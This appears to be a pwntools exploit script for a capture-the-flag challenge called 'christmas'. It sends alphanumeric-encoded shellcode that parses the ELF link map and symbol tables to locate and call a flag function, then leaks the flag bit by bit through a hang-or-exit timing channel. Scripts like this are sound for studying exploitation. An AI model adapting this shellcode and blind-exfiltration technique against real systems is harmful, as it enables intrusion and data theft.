#coding=utf8
from pwn import *
from amd64_alphanum_encoder import alphanum_encoder
# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./christmas')
	# bin = ELF('./christmas',checksec=False)
	#libc = ELF('',checksec=False)
else:
	#cn = remote('')
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

context.arch = 'amd64'


def leakat(nbyte,nbit):
	if local:
		cn = process('./christmas')
		# bin = ELF('./christmas',checksec=False)
		#libc = ELF('',checksec=False)
	else:
		#cn = remote('')
		pass
	cn.recvuntil('??')

	sc = '''
	mov rax,[0x602008] /* get linkmap */
	mov rcx,0x7f0000000000
	loop1:
	mov rax,[rax+0x18] /* l_next */
	cmp rax,rcx
	jge loop1

	mov rcx,[rax+0x8] /* l_name */
	mov rbx,[rax] /* lib base in rbx*/
	mov rax,rbx

	func_get_dyn:
	mov rbx,rax
	add rbx,qword ptr [rax+0x20] /* phoff in rbx */
	cmp word ptr [rax+0x10],3 /* ET_DYN */
	cmovz r10,rax /* store code base in r10 */
	loop2:
	cmp dword ptr [rbx],0x2 /* PT_DYNAMIC */
	jz lbl2
	add rbx,0x38 /* pht_size */
	jmp loop2
	lbl2: 
	mov rbx,qword ptr[rbx+0x10] /* get Dynamic segment (no pie)*/
	test r10,r10
	je jmpout1
	add rbx,r10 /* get Dynamic segment (have pie)*/
	jmpout1:

	push rbx
	loop7:
	cmp qword ptr [rbx],0x5 /* find DT_STRTAB */
	jz lbl7
	add rbx,0x10
	jmp loop7
	lbl7:
	mov rbx, qword ptr [rbx+8] /* strtab address in rbx */

	pop rax
	loop8:
	cmp qword ptr [rax],0x6 /* find DT_SYMTAB */
	jz lbl8
	add rax,0x10
	jmp loop8
	lbl8:
	mov rdx, qword ptr [rax+8] /* symtab address in rax */

	/* now rdx -> symtab */
	/* now rbx -> strtab */

	/* push 'flag_yes_1337' */
	mov rax, 0x373333315f
	push rax
	mov rax, 0x7365795f67616c66
	push rax
	mov rdi,rsp

	/* calc str length */
	push rdi /* backup rdi */
	xor eax,eax
	push -1
	pop rcx
	repnz scas al, BYTE PTR [rdi]
	/* inc rcx */
	neg rcx
	pop rdi /* restore rdi */

	loop9:
	push rcx
	mov esi, dword ptr [rdx]
	add rsi,rbx
	push rdi /* backup rdi */
	repz cmps byte ptr [rsi],byte ptr [rdi]
	pop rdi /* restore rdi */
	test rcx,rcx
	pop rcx
	je match
	add rdx,0x18 /* next symtab(sym size) */
	jmp loop9
	match:
	mov rax, qword ptr [rdx+8]
	add rax,r10

	call rax /* flag in rax */

	add rax,{}
	mov al,[rax]
	shr al,{}
	and al,1
	test al,al
	jz myloop

	myexit: /* 1 */
	mov rax,60
	syscall

	myloop: /* 0 */
	jmp myloop
	'''.format(nbyte,nbit)# nbyte nbit

	cn.send(alphanum_encoder(asm(sc),0x30))
	sleep(0.2)
	try:
		cn.recv(timeout=1)
		cn.sendline('test')
	except:
		cn.close()
		return 1
	cn.close()
	return 0

flag=''
while True:
	ch=''
	for c in range(8):
		bit = leakat(len(flag),len(ch))
		ch=str(bit)+ch
		print ch
	tmp = int(ch,2)
	if tmp != 0:
		flag+=chr(tmp)
		print flag
	else:
		break

print flag